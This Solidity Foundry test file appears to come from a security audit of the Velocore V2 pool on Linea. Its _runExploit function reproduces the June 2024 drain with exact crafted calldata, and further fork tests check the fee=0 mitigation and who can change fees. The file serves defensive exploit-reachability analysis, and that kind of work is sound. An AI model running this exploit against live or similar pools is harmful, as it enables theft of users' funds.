// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

// ---------------------------------------------------------------------------
// H-47 · Velocore V2 (Linea) — live-state & exploit-reachability PoC
// Read-only fork tests. No mainnet transactions.
// Original exploit: DeFiHackLabs src/test/2024-06/Velocore_exp.sol
// (tx 0xED11d5b013BF3296b1507da38b7BCb97845dd037d33d3d1b0c5e763889cdbed1)
// ---------------------------------------------------------------------------

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IConstantProductPool {
    function velocore__execute(address, bytes32[] calldata, int128[] memory, bytes calldata)
        external
        returns (int128[] memory, int128[] memory);
    function totalSupply() external view returns (uint256);
    function poolBalances() external view returns (uint256[] memory);
    function fee1e9() external view returns (uint32);
    function feeMultiplier() external view returns (uint128);
    function decayRate() external view returns (uint32);
    function setParam(uint256 fee1e9_, uint256 decayRate_) external;
}

struct VelocoreOperation {
    bytes32 poolId;
    bytes32[] tokenInformations;
    bytes data;
}

interface ISwapFacet {
    function execute(bytes32[] memory tokens, int128[] memory deposit, VelocoreOperation[] memory ops)
        external
        payable;
}

interface IFactory {
    function getPools(uint256 begin, uint256 maxLength) external view returns (address[] memory);
    function poolsLength() external view returns (uint256);
}

contract VelocoreH47Test is Test {
    address constant VAULT = 0x1d0188c4B276A09366D05d6Be06aF61a73bC7535;
    address constant POOL = 0xe2c67A9B15e9E7FF8A9Cb0dFb8feE5609923E5DB;
    address constant USDC = 0x176211869cA2b568f2A7D4EE941E073a821EE1ff;
    address constant FACTORY = 0xBe6c6A389b82306e88d74d1692B67285A9db9A47;
    address constant TREASURY = 0x1234561fEd41DD2D867a038bBdB857f291864225;
    address constant ATTACKER = 0x00000000000000000000000000000000DeaDBeef;

    bytes32 constant USDC32 = 0x000000000000000000000000176211869cA2B568f2a7d4ee941e073a821ee1ff;
    bytes32 constant ETH32 = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeEeeeeeeeeeeeeeeeeeeeeeeee;
    bytes32 constant VLP32 = 0x000000000000000000000000e2C67a9b15e9E7Ff8a9cb0dfb8fee5609923e5db;

    uint256 constant PRE_HACK_BLOCK = 5_079_176; // 2024-06-01, just before the attack

    receive() external payable {}

    function _lineaRpc() internal view returns (string memory) {
        return vm.envOr("LINEA_RPC_URL", string("https://rpc.linea.build"));
    }

    function _forkHistorical() internal {
        vm.createSelectFork(_lineaRpc(), PRE_HACK_BLOCK);
    }

    function _forkLatest() internal {
        vm.createSelectFork(_lineaRpc());
    }

    function _runExploit() internal returns (uint256 profit) {
        uint256 before = IERC20(USDC).balanceOf(address(this));

        bytes32[] memory tokens = new bytes32[](2);
        tokens[0] = USDC32;
        tokens[1] = VLP32;

        int128[] memory amounts = new int128[](2);
        amounts[0] = 170_141_183_460_469_231_731_687_303_715_884_105_727;
        amounts[1] = 8_616_292_632_827_688;

        IConstantProductPool(POOL).velocore__execute(address(this), tokens, amounts, hex"");
        IConstantProductPool(POOL).velocore__execute(address(this), tokens, amounts, hex"");
        IConstantProductPool(POOL).velocore__execute(address(this), tokens, amounts, hex"");

        bytes32[] memory tokenRef = new bytes32[](3);
        tokenRef[0] = USDC32;
        tokenRef[1] = ETH32;
        tokenRef[2] = VLP32;

        int128[] memory deposit = new int128[](3);

        VelocoreOperation[] memory ops = new VelocoreOperation[](4);
        ops[0].poolId = VLP32;
        ops[0].tokenInformations = new bytes32[](3);
        ops[0].tokenInformations[0] = 0x00000000000000000000000000000000FFFFfFFFffffffffffffff787406ca5f;
        ops[0].tokenInformations[1] = 0x010100000000000000000000000000007fFFfFFfffffffffffffffffffffffff;
        ops[0].tokenInformations[2] = 0x020100000000000000000000000000007fFFFfFfffffffffffffffffffffffff;
        ops[1].poolId = VLP32;
        ops[1].tokenInformations = new bytes32[](3);
        ops[1].tokenInformations[0] = 0x00000000000000000000000000000000FFFFfFFFfffffffffffffffd4a0022c4;
        ops[1].tokenInformations[1] = 0x010100000000000000000000000000007fFFfFFfffffffffffffffffffffffff;
        ops[1].tokenInformations[2] = 0x020100000000000000000000000000007fFFFfFfffffffffffffffffffffffff;
        ops[2].poolId = VLP32;
        ops[2].tokenInformations = new bytes32[](3);
        ops[2].tokenInformations[0] = 0x00000000000000000000000000000000FFFFfFFFfffffffffffffffff21eb904;
        ops[2].tokenInformations[1] = 0x010100000000000000000000000000007fFFfFFfffffffffffffffffffffffff;
        ops[2].tokenInformations[2] = 0x020100000000000000000000000000007fFFFfFfffffffffffffffffffffffff;
        ops[3].poolId = VLP32;
        ops[3].tokenInformations = new bytes32[](2);
        ops[3].tokenInformations[0] = 0x00000000000000000000000000000000FFFFfFFFffffffffffffffffffffd8f0;
        ops[3].tokenInformations[1] = 0x020100000000000000000000000000007fFFFfFfffffffffffffffffffffffff;

        ISwapFacet(VAULT).execute(tokenRef, deposit, ops);

        uint256 afterBal = IERC20(USDC).balanceOf(address(this));
        profit = afterBal > before ? afterBal - before : 0;
    }

    // ------------------------------------------------------------------
    // 1. Historical reproduction: the exact exploit still drains value at
    //    the pre-attack block (mechanism sanity check).
    // ------------------------------------------------------------------
    function test_historical_exploit_reproduces() public {
        _forkHistorical();
        uint256 profit = _runExploit();
        console.log("[historical] USDC profit (raw):", profit);
        assertGt(profit, 0, "historical exploit must reproduce");
    }

    // ------------------------------------------------------------------
    // 2. Historical + fee set to 0 by the treasury (the real mitigation):
    //    the same exploit no longer yields profit.
    // ------------------------------------------------------------------
    function test_historical_feeZero_blocks_exploit() public {
        _forkHistorical();
        uint32 decay = IConstantProductPool(POOL).decayRate();
        vm.prank(TREASURY);
        IConstantProductPool(POOL).setParam(0, decay);
        assertEq(IConstantProductPool(POOL).fee1e9(), 0, "fee must be zero");

        bool reverted;
        uint256 profit;
        try this.exploitExternal() returns (uint256 p) {
            profit = p;
        } catch {
            reverted = true;
        }
        console.log("[historical fee=0] reverted:", reverted, "profit:", profit);
        assertEq(profit, 0, "fee=0 must block profit");
    }

    function exploitExternal() external returns (uint256) {
        return _runExploit();
    }

    // ------------------------------------------------------------------
    // 3. Historical: treasury can re-enable the fee (P-latent path).
    // ------------------------------------------------------------------
    function test_historical_treasury_can_set_fee() public {
        _forkHistorical();
        uint32 decay = IConstantProductPool(POOL).decayRate();
        vm.prank(TREASURY);
        IConstantProductPool(POOL).setParam(0, decay);
        assertEq(IConstantProductPool(POOL).fee1e9(), 0);
        vm.prank(TREASURY);
        IConstantProductPool(POOL).setParam(3_000_000, decay);
        assertEq(IConstantProductPool(POOL).fee1e9(), 3_000_000, "treasury can re-arm fee");
    }

    // ------------------------------------------------------------------
    // 4. Live state: every pool on Linea has fee1e9 == 0.
    // ------------------------------------------------------------------
    function test_current_all_pools_fee_zero() public {
        _forkLatest();
        uint256 n = IFactory(FACTORY).poolsLength();
        console.log("[current] pools:", n);
        assertGt(n, 40, "expected ~46 pools");
        address[] memory pools = IFactory(FACTORY).getPools(0, n);
        uint256 zeroCount;
        for (uint256 i = 0; i < pools.length; i++) {
            uint32 f = IConstantProductPool(pools[i]).fee1e9();
            if (f == 0) zeroCount++;
            else console.log("[current] NONZERO fee pool:", pools[i], f);
        }
        assertEq(zeroCount, pools.length, "all pools must have fee1e9==0");
    }

    // ------------------------------------------------------------------
    // 5. Live state: the exploit no longer yields profit (fee=0).
    // ------------------------------------------------------------------
    function test_current_exploit_no_profit() public {
        _forkLatest();
        bool reverted;
        uint256 profit;
        try this.exploitExternal() returns (uint256 p) {
            profit = p;
        } catch {
            reverted = true;
        }
        console.log("[current] exploit reverted:", reverted, "profit:", profit);
        assertEq(profit, 0, "no profit extractable today");
    }

    // ------------------------------------------------------------------
    // 6. Live state: the treasury EOA can still re-enable the fee on the
    //    live pool -> the code is unchanged; the fee=0 state is the only
    //    mitigation (P-latent).
    // ------------------------------------------------------------------
    function test_current_treasury_can_reenable_fee() public {
        _forkLatest();
        uint32 decay = IConstantProductPool(POOL).decayRate();
        vm.prank(TREASURY);
        IConstantProductPool(POOL).setParam(100_000_000, decay); // 10%
        assertEq(IConstantProductPool(POOL).fee1e9(), 100_000_000, "treasury can re-enable fee today");
    }

    // ------------------------------------------------------------------
    // 7. Live state: an arbitrary attacker cannot set the fee.
    // ------------------------------------------------------------------
    function test_current_attacker_cannot_set_fee() public {
        _forkLatest();
        uint32 decay = IConstantProductPool(POOL).decayRate();
        vm.prank(ATTACKER);
        vm.expectRevert();
        IConstantProductPool(POOL).setParam(100_000_000, decay);
    }
}
